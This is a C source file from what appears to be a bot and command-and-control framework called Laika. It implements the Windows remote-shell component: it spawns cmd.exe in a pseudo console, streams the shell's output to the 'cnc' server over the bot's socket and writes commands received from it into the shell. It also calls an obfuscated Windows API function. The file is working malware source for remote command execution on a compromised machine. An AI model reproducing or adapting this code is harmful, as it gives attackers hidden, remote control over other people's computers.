/* platform specific code for opening shells (pseudo consoles) on windows */
#include "bot.h"
#include "obf.h"
#include "lerror.h"
#include "lmem.h"
#include "shell.h"

#include <process.h>
#include <windows.h>

/* shells are significantly more complex on windows than linux for laika */
struct sLaika_RAWshell
{
    struct sLaika_shell _shell;
    HANDLE in, out;
    PROCESS_INFORMATION procInfo;
    STARTUPINFOEX startupInfo;
    HPCON pseudoCon;
};

HRESULT CreatePseudoConsoleAndPipes(HPCON *phPC, HANDLE *phPipeIn, HANDLE *phPipeOut, int cols,
                                    int rows);
HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo, HPCON hPC);

struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id)
{
    TCHAR szComspec[MAX_PATH];
    struct sLaika_RAWshell *shell =
        (struct sLaika_RAWshell *)laikaM_malloc(sizeof(struct sLaika_RAWshell));
    HRESULT hr;

    ZeroMemory(shell, sizeof(struct sLaika_RAWshell));
    shell->_shell.id = id;

    /* create pty */
    hr = CreatePseudoConsoleAndPipes(&shell->pseudoCon, &shell->in, &shell->out, cols, rows);
    if (hr != S_OK) {
        laikaM_free(shell);
        return NULL;
    }

    /* get user's shell path */
    if (GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) == 0) {
        laikaM_free(shell);
        return NULL;
    }

    /* create process */
    hr = InitializeStartupInfoAttachedToPseudoConsole(&shell->startupInfo, shell->pseudoCon);
    if (hr != S_OK) {
        ClosePseudoConsole(shell->pseudoCon);

        laikaM_free(shell);
        return NULL;
    }

    /* launch cmd shell */
    hr = CreateProcess(NULL,                            /* No module name - use Command Line */
                       szComspec,                       /* Command Line */
                       NULL,                            /* Process handle not inheritable */
                       NULL,                            /* Thread handle not inheritable */
                       FALSE,                           /* Inherit handles */
                       EXTENDED_STARTUPINFO_PRESENT,    /* Creation flags */
                       NULL,                            /* Use parent's environment block */
                       NULL,                            /* Use parent's starting directory */
                       &shell->startupInfo.StartupInfo, /* Pointer to STARTUPINFO */
                       &shell->procInfo)                /* Pointer to PROCESS_INFORMATION */
             ? S_OK
             : HRESULT_FROM_WIN32(GetLastError());

    if (hr != S_OK) {
        DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
        laikaM_free(shell->startupInfo.lpAttributeList);

        ClosePseudoConsole(shell->pseudoCon);

        laikaM_free(shell);
        return NULL;
    }

    return (struct sLaika_shell *)shell;
}

void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *_shell)
{
    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell *)_shell;

    /* kill process (it's ok if it fails) */
    TerminateProcess(shell->procInfo.hProcess, 0);

    /* cleanup process - info & thread */
    CloseHandle(shell->procInfo.hThread);
    CloseHandle(shell->procInfo.hProcess);

    /* Cleanup attribute list */
    DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
    laikaM_free(shell->startupInfo.lpAttributeList);

    /* close pseudo console */
    ClosePseudoConsole(shell->pseudoCon);

    /* free shell struct */
    laikaM_free(shell);
}

/* ====================================[[ Shell Handlers ]]===================================== */

/* edited from
 * https://github.com/microsoft/terminal/blob/main/samples/ConPTY/EchoCon/EchoCon/EchoCon.cpp */
HRESULT CreatePseudoConsoleAndPipes(HPCON *phPC, HANDLE *phPipeIn, HANDLE *phPipeOut, int cols,
                                    int rows)
{
    COORD consoleSize = (COORD){.X = cols, .Y = rows};
    HANDLE hPipePTYIn = INVALID_HANDLE_VALUE;
    HANDLE hPipePTYOut = INVALID_HANDLE_VALUE;
    HRESULT hr;
    DWORD mode = PIPE_NOWAIT;

    /* create the pipes to which the ConPTY will connect */
    if (!CreatePipe(&hPipePTYIn, phPipeOut, NULL, 0) ||
        !CreatePipe(phPipeIn, &hPipePTYOut, NULL, 0))
        return HRESULT_FROM_WIN32(GetLastError());

    /* anon pipes can be set to non-blocking for backwards compatibility. this makes our life much
       easier so it fits in nicely with the rest of the laika codebase
       (https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-setnamedpipehandlestate)
    */
    if (!SetNamedPipeHandleState(*phPipeIn, &mode, NULL, NULL))
        return HRESULT_FROM_WIN32(GetLastError());

    /* create the pseudo console of the required size, attached to the PTY - end of the pipes */
    hr = oCreatePseudoConsole(consoleSize, hPipePTYIn, hPipePTYOut, 0, phPC);

    /* we can close the handles to the PTY-end of the pipes here
       because the handles are dup'ed into the ConHost and will be released
       when the ConPTY is destroyed. */
    CloseHandle(hPipePTYOut);
    CloseHandle(hPipePTYIn);
    return hr;
}

/* also edited from
 * https://github.com/microsoft/terminal/blob/main/samples/ConPTY/EchoCon/EchoCon/EchoCon.cpp */
HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo, HPCON hPC)
{
    HRESULT hr = E_UNEXPECTED;

    if (pStartupInfo) {
        size_t attrListSize = 0;
        pStartupInfo->StartupInfo.cb = sizeof(STARTUPINFOEX);

        /* Get the size of the thread attribute list & allocate it */
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
        pStartupInfo->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)laikaM_malloc(attrListSize);

        /* Initialize thread attribute list */
        if (pStartupInfo->lpAttributeList &&
            InitializeProcThreadAttributeList(pStartupInfo->lpAttributeList, 1, 0, &attrListSize)) {

            /* Set Pseudo Console attribute */
            hr = UpdateProcThreadAttribute(pStartupInfo->lpAttributeList, 0,
                                           PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, hPC, sizeof(HPCON),
                                           NULL, NULL)
                     ? S_OK
                     : HRESULT_FROM_WIN32(GetLastError());
        } else {
            hr = HRESULT_FROM_WIN32(GetLastError());
        }
    }

    return hr;
}

bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *_shell)
{
    char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH - sizeof(uint32_t)];
    struct sLaika_peer *peer = bot->peer;
    struct sLaika_socket *sock = &peer->sock;
    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell *)_shell;
    DWORD rd;
    bool readSucc =
        ReadFile(shell->in, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH - sizeof(uint32_t), &rd, NULL);

    if (readSucc) {
        /* we read some input! send to cnc */
        laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
        laikaS_writeInt(sock, &shell->_shell.id, sizeof(uint32_t));
        laikaS_write(sock, readBuf, rd);
        laikaS_endVarPacket(peer);
    } else {
        if (GetLastError() == ERROR_NO_DATA &&
            WaitForSingleObject(shell->procInfo.hProcess, 0) == WAIT_TIMEOUT)
            return true; /* recoverable, process is still alive */
        /* unrecoverable error */
        laikaB_freeShell(bot, _shell);
        return false;
    }

    return true;
}

bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *_shell, char *buf,
                       size_t length)
{
    struct sLaika_peer *peer = bot->peer;
    struct sLaika_socket *sock = &peer->sock;
    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell *)_shell;
    size_t nLeft;
    DWORD nWritten;

    nLeft = length;
    while (nLeft > 0) {
        if (!WriteFile(shell->out, (void *)buf, length, &nWritten, NULL)) {
            /* unrecoverable error */
            laikaB_freeShell(bot, _shell);
            return false;
        }

        if (nWritten == 0)
            break;

        nLeft -= nWritten;
        buf += nWritten;
    }

    return true;
}